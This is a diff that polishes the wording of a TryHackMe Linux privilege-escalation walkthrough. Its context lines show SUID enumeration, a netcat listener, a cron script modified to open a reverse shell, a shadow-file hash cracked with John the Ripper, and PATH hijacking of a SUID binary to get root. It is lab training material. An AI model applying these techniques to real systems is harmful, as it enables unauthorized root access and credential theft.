@@ -698,7 +698,7 @@ Answer: `gerryconway`
 
 #### What is the password of user2?
 
-First we check for SUID-programs that can be used to read the `/etc/passwd`.
+First we check for SUID-programs that can be used to read the `/etc/shadow` file.
 
 ```bash
 $ find / -type f -perm /4000 2>/dev/null
@@ -1085,9 +1085,9 @@ ls: cannot access '/tmp/test.py': No such file or directory
 $ 
 ```
 
-that we can modify our `backup.sh` script. The other script are not still present.
+that we can modify our `backup.sh` script. The other scripts do not exist (anymore).
 
-Let's change the `backup.sh` to run a reverse shell instead, but first we create a netcat listener
+Let's change the `backup.sh` to also run a reverse shell. But first we create a netcat listener to accept the incoming connection.
 
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_Privilege_Escalation]
@@ -1096,7 +1096,7 @@ listening on [any] 12345 ...
 
 ```
 
-We add a line that create a reverse shell back to our Kali machine and make sure it is executable
+We add a line that create a reverse shell back to our Kali machine and make sure the script is executable.
 
 ```bash
 $ vi backup.sh
@@ -1112,7 +1112,7 @@ $ chmod +x backup.sh
 $ 
 ```
 
-and wait a minute or so for the connection
+Then we wait a minute or so for the connection.
 
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_Privilege_Escalation]
@@ -1127,7 +1127,7 @@ uid=0(root) gid=0(root) groups=0(root)
 root@ip-10-64-138-82:~# 
 ```
 
-Now we can get the flag
+Now we can get the flag:
 
 ```bash
 root@ip-10-64-138-82:~# find / -name flag5.txt
@@ -1186,7 +1186,7 @@ lxd:!:18798::::::
 matt:$6$WHmIjebL7MA7KN9A$C4UBJB4WVI37r.Ct3Hbhd3YOcua3AUowO2w2RUNauW8IigHAyVlHzhLrIUxVSGa.twjHc71MoBJfjCTxrkiLR.:18798:0:99999:7:::
 ```
 
-Then we carck it with JtR as before
+Then we crack it with JtR as before
 
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_Privilege_Escalation]
@@ -1367,7 +1367,7 @@ $
 
 We have a SUID-binary `test` that seems to execute the file `thm.py` which in turn execute the `thm` command.
 
-We create a copy of `/bin/bash` in the `tmp` directory and add `/tmp` to the PATH
+We create a copy of `/bin/bash` in the `/tmp` directory and add `/tmp` to the PATH
 
 ```bash
 $ cp /bin/bash /tmp/thm
@@ -1377,7 +1377,7 @@ $ echo $PATH
 $ 
 ```
 
-Then we run the `test`-binary again to get a root shell
+Then we run the `test` binary again to get a root shell
 
 ```bash
 $ /home/murdoch/test
@@ -1804,7 +1804,7 @@ VEhNLTE2ODgyNDc4MjM5MDIzOAo=
 [leonard@ip-10-64-169-53 ~]$ 
 ```
 
-During some enumeration of local file a `.bash_history` file was found:
+During some enumeration of local files a `.bash_history` file was found:
 
 ```bash
 [leonard@ip-10-64-169-53 ~]$ ls -la
